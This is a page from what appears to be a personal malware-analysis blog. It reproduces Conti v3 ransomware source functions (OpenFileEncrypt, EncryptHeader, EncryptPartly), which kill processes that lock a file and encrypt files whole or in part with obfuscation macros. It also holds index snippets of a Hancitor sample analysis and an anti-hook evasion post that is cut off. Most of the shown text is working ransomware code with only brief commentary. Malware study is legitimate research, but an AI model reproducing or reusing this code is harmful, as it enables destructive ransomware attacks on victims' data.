class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line"><span class="title function_">OpenFileEncrypt</span><span class="params">(__in cryptor::LPFILE_INFO FileInfo)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD Attributes = (DWORD)pGetFileAttributesW(FileInfo-&gt;Filename);</span><br><span class="line">	<span class="keyword">if</span> (Attributes != INVALID_FILE_ATTRIBUTES) &#123;</span><br><span class="line">		<span class="keyword">if</span> (Attributes &amp; FILE_ATTRIBUTE_READONLY) &#123;</span><br><span class="line">			pSetFileAttributesW(FileInfo-&gt;Filename, Attributes ^ FILE_ATTRIBUTE_READONLY);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	FileInfo-&gt;FileHandle = pCreateFileW(FileInfo-&gt;Filename,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	DWORD LastError = (DWORD)pGetLastError();</span><br><span class="line">	<span class="keyword">if</span> (FileInfo-&gt;FileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (LastError == ERROR_SHARING_VIOLATION ||</span><br><span class="line">			LastError == ERROR_LOCK_VIOLATION)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			logs::Write(OBFW(<span class="string">L&quot;File %s is already open by another program.&quot;</span>), FileInfo-&gt;Filename);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (KillFileOwner(FileInfo-&gt;Filename))</span><br><span class="line">			&#123;</span><br><span class="line"></span><br><span class="line">				logs::Write(OBFW(<span class="string">L&quot;KillFileOwner for file %s - success&quot;</span>), FileInfo-&gt;Filename);</span><br><span class="line"></span><br><span class="line">				FileInfo-&gt;FileHandle = pCreateFileW(FileInfo-&gt;Filename,</span><br><span class="line">					GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					<span class="literal">NULL</span>,</span><br><span class="line">					OPEN_EXISTING,</span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (FileInfo-&gt;FileHandle == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">					logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t open file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">					<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				logs::Write(OBFW(<span class="string">L&quot;KillFileOwner for file %s - error. GetLastError = %lu.&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t open file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LARGE_INTEGER FileSize;</span><br><span class="line">	<span class="keyword">if</span> (!pGetFileSizeEx(FileInfo-&gt;FileHandle, &amp;FileSize) || !FileSize.QuadPart) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get file size %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		CloseHandle(FileInfo-&gt;FileHandle);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	FileInfo-&gt;FileSize = FileSize.QuadPart;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="EncryptHeader"><a href="#EncryptHeader" class="headerlink" title="EncryptHeader"></a>EncryptHeader</h4><p>encrypt the file’s first 1048576 byte </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">EncryptHeader</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo,</span></span><br><span class="line"><span class="params">	__in LPBYTE Buffer,</span></span><br><span class="line"><span class="params">	__in HCRYPTPROV CryptoProvider,</span></span><br><span class="line"><span class="params">	__in HCRYPTKEY PublicKey</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL Success = FALSE;</span><br><span class="line">	DWORD BytesRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToWrite = <span class="number">0</span>;</span><br><span class="line">	LONGLONG TotalRead = <span class="number">0</span>;</span><br><span class="line">	LONGLONG BytesToEncrypt;</span><br><span class="line">	LARGE_INTEGER Offset;</span><br><span class="line"></span><br><span class="line">	BytesToEncrypt = <span class="number">1048576</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TotalRead &lt; BytesToEncrypt) &#123;</span><br><span class="line"></span><br><span class="line">		morphcode(TotalRead);</span><br><span class="line"></span><br><span class="line">		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesLeft);</span><br><span class="line"></span><br><span class="line">		BytesToRead = BytesLeft &gt; BufferSize ? BufferSize : (DWORD)BytesLeft;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesToRead);</span><br><span class="line"></span><br><span class="line">		Success = (BOOL)pReadFile(FileInfo-&gt;FileHandle, Buffer, BytesToRead, &amp;BytesRead, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (!Success || !BytesRead) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesRead);</span><br><span class="line"></span><br><span class="line">		TotalRead += BytesRead;</span><br><span class="line">		BytesToWrite = BytesRead;</span><br><span class="line"></span><br><span class="line">		morphcode(TotalRead);</span><br><span class="line"></span><br><span class="line">		ECRYPT_encrypt_bytes(&amp;FileInfo-&gt;CryptCtx, Buffer, Buffer, BytesRead);</span><br><span class="line"></span><br><span class="line">		morphcode(Buffer);</span><br><span class="line"></span><br><span class="line">		Offset.QuadPart = -((LONGLONG)BytesRead);</span><br><span class="line">		<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_CURRENT)) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(Offset.QuadPart);</span><br><span class="line"></span><br><span class="line">		Success = WriteFullData(FileInfo-&gt;FileHandle, Buffer, BytesToWrite);</span><br><span class="line">		<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesToWrite);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="EncryptPartly"><a href="#EncryptPartly" class="headerlink" title="EncryptPartly"></a>EncryptPartly</h4><p>if the file is Virtual Machine Extension, then EncryptPartly</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220429142152244.png" alt="image-20220429142152244"></p>
<p>if the filesize is over 5242880 byte, then EncryptPartly.</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220429142228715.png" alt="image-20220429142228715"></p>
<p>Judge the file size and decide how many percent the code wanna Encrypt.</p>
<blockquote>
<p>the global::GetEncrypSize return value is 50, so if the filesize is over 5242880, it will encrypt the 10% size data of this file.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">EncryptPartly</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo,</span></span><br><span class="line"><span class="params">	__in LPBYTE Buffer,</span></span><br><span class="line"><span class="params">	__in HCRYPTPROV CryptoProvider,</span></span><br><span class="line"><span class="params">	__in HCRYPTKEY PublicKey,</span></span><br><span class="line"><span class="params">	__in BYTE DataPercent</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL Success = FALSE;</span><br><span class="line">	DWORD BytesRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToWrite = <span class="number">0</span>;</span><br><span class="line">	LONGLONG TotalRead = <span class="number">0</span>;</span><br><span class="line">	LONGLONG BytesToEncrypt;</span><br><span class="line">	LARGE_INTEGER Offset;</span><br><span class="line">	LONGLONG PartSize = <span class="number">0</span>;</span><br><span class="line">	LONGLONG StepSize = <span class="number">0</span>;</span><br><span class="line">	INT StepsCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (DataPercent) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">4</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">5</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">7</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">9</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">30</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">10</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">35</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">12</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">40</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">14</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">50</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">10</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">5</span>;</span><br><span class="line">		StepSize = PartSize;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">60</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">20</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">70</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">23</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">27</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; StepsCount; i++) &#123;</span><br><span class="line"></span><br><span class="line">		TotalRead = <span class="number">0</span>;</span><br><span class="line">		BytesToEncrypt = PartSize;</span><br><span class="line">		morphcode(BytesToEncrypt);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">			Offset.QuadPart = StepSize;</span><br><span class="line">			<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_CURRENT)) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			morphcode(Offset.QuadPart);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (TotalRead &lt; BytesToEncrypt) &#123;</span><br><span class="line"></span><br><span class="line">			morphcode(TotalRead);</span><br><span class="line"></span><br><span class="line">			LONGLONG BytesLeft = BytesToEncrypt - TotalRead;</span><br><span class="line">			morphcode(BytesLeft);</span><br><span class="line">			BytesToRead = BytesLeft &gt; BufferSize ? BufferSize : (DWORD)BytesLeft;</span><br><span class="line"></span><br><span class="line">			morphcode(BytesToRead);</span><br><span class="line"></span><br><span class="line">			Success = (BOOL)pReadFile(FileInfo-&gt;FileHandle, Buffer, BytesToRead, &amp;BytesRead, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="keyword">if</span> (!Success || !BytesRead) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			morphcode(BytesRead);</span><br><span class="line"></span><br><span class="line">			TotalRead += BytesRead;</span><br><span class="line">			BytesToWrite = BytesRead;</span><br><span class="line"></span><br><span class="line">			morphcode(TotalRead);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			ECRYPT_encrypt_bytes(&amp;FileInfo-&gt;CryptCtx, Buffer, Buffer, BytesRead);</span><br><span class="line"></span><br><span class="line">			Offset.QuadPart = -((LONGLONG)BytesRead);</span><br><span class="line">			<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_CURRENT)) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			morphcode(Offset.QuadPart);</span><br><span class="line"></span><br><span class="line">			Success = WriteFullData(FileInfo-&gt;FileHandle, Buffer, BytesToWrite);</span><br><span class="line">			<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			morphcode(BytesToWrite);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="EncryptFull"><a href="#EncryptFull" class="headerlink" title="EncryptFull"></a>EncryptFull</h4><p>It’s the same as EncryptPartly function,just remove the percent argument.</p>
<blockquote>
<p>morphcode</p>
</blockquote>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-30</span><i class="fa fa-tag"></i><a class="tag" href="/tags/Ransomeware-Conti-v3/" title="Ransomeware,Conti v3">Ransomeware,Conti v3 </a><span class="leancloud_visitors"></span><span>About 8341 words, 27 min 48 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/28/2021-12-16-hancitor/">2021-12-16-hancitor</a></h3></div><div class="post-content"><div class="card"><p><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>之前看过两个hancitor的样本，但是从现在看来做的都太简单了，而且当时的各方面知识也都不是很完善。于是找了2021.12.26日的样本重新做一次详尽的分析。</p>
<blockquote>
<p>如果有错误可以联系我</p>
<p>qq：2466811523</p>
<p>mail: <a href="mailto:&#x32;&#52;&#54;&#54;&#x38;&#x31;&#x31;&#x35;&#50;&#51;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x32;&#52;&#54;&#54;&#x38;&#x31;&#x31;&#x35;&#50;&#51;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a></p>
</blockquote>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><blockquote>
<p>md5: 9f09b1dd6235c28b091a7dbc9bcd9482<br>sha1: b7ac19b82e2f946e7cc047421875bbade3e880fd<br>sha256: 571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74</p>
<p>vt: <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/details">https://www.virustotal.com/gui/file/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/details</a></p>
<p>hybrid: <a target="_blank" rel="noopener" href="https://hybrid-analysis.com/sample/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/61bb60be5679f80b2921e45a">https://hybrid-analysis.com/sample/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/61bb60be5679f80b2921e45a</a></p>
<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/beaconeye-cs/">http://blog.nsfocus.net/beaconeye-cs/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.malware-traffic-analysis.net/2021/12/16/index.html">https://www.malware-traffic-analysis.net/2021/12/16/index.html</a></p>
</blockquote></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-28</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 2470 words, 8 min 13 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/18/anti-hook/">anti-hook</a></h3></div><div class="post-content"><div class="card"><p><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>part of conti v3 Ransomeware, by the way, fucking the school’s midterm exam. I’m longing for the day becoming stronger in Virus Learning. </p>
<h2 id="打开系统对应的文件"><a href="#打开系统对应的文件" class="headerlink" title="打开系统对应的文件"></a>打开系统对应的文件</h2><p>导入kernel32.dll并获取文件路径,打开文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hKernel32 = apLoadLibraryA(_STR(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">apGetModuleFileNameW(hmodule, moduleRealPath, MAX_PATH);</span><br><span class="line"></span><br><span class="line">hFile = pCreateFileW(moduleRealPath, GENERIC_READ, FILE_SHARE_READ, <span class="number">0</span>, OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> 